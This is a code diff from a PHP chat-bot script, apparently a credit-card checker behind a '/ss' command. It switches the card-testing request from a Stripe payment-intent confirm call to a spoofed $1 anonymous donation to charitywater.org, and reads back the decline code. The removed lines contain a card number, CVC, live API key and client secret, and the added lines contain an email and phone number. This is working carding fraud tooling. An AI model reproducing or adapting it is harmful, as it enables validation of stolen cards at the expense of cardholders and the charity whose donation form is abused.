@@ -163,17 +163,18 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             
             if(!$stripeerror){
                 $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LNaQuCPBTfxNhAO19V2kq6W/confirm');
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, ' https://www.charitywater.org/donate/stripe');
                 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                 curl_setopt($ch, CURLOPT_HEADER, 0);
                 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-                'Host: api.stripe.com',
-                'Accept: application/json',
+                'Host: www.charitywater.org',
+                'Accept: */*',
                 'Accept-Language: en-US,en;q=0.5',
                 'Accept-Encoding: gzip, deflate, br',
-                'Origin: https://js.stripe.com',
+                'Origin: https://www.charitywater.org',
                 'Content-Type: application/x-www-form-urlencoded',
-                'Referer: https://js.stripe.com/',
+                'Referer: https://www.charitywater.org/',
                 'Sec-Fetch-Dest: empty',
                 'Sec-Fetch-Mode: no-cors',
                 'Sec-Fetch-Site: cross-site',
@@ -184,7 +185,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-                curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=jacob+maxn&payment_method_data[billing_details][address][city]=+New+York&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=13th+ave+st&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]=6516529998742268&payment_method_data[card][cvc]=753&payment_method_data[card][exp_month]=12&payment_method_data[card][exp_year]=23&payment_method_data[guid]=912f3a77-00d6-4023-b81b-2e63e02641d2b829d5&payment_method_data[muid]=1a7fc9c7-471b-4aed-a1b5-7cea0caf83aef56d3f&payment_method_data[sid]=5921e0fb-6d0b-45c3-a353-c6676e3f57b4afd8cb&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F5121664f0%3B+stripe-js-v3%2F5121664f0&payment_method_data[time_on_page]=24785&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51GtEAVCPBTfxNhAOgG5TfwPQRmY59A8HluifMEKkTlNonq23OrPPKMTP1qnUJBcCUGqTn6CSlQbMsFRZPo8mD5Ac00ETfGI9dH&client_secret=pi_3LNaQuCPBTfxNhAO19V2kq6W_secret_2RDdHaxrZzGXQGIw1AQovIqV3');
+                curl_setopt($ch, CURLOPT_POSTFIELDS, "country=us&payment_intent%5Bemail%5D=jacobmaxon2%40gmail.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bmetadata%5D%5Banalytics_id%5D=30392ca2-9b13-4f72-9d96-9f0fbc2057c2&payment_intent%5Bpayment_method%5D=$id&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Banonymous%5D=true&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=jacobmaxon2%40gmail.com&donation_form%5Bname%5D=$name&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=$kast&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Banalytics_uuid%5D=30392ca2-9b13-4f72-9d96-9f0fbc2057c2&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bprofile_campaign_id%5D=&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&donation_form%5Bmetadata%5D%5Bphone_number%5D=%2B19174856485&donation_form%5Bmetadata%5D%5Bphone_number_consent_granted%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Breferer%5D=https%3A%2F%2Fcwtr.org%2F2nuqU8B&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false");
                 $result2 = curl_exec($ch);
                 $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
             }
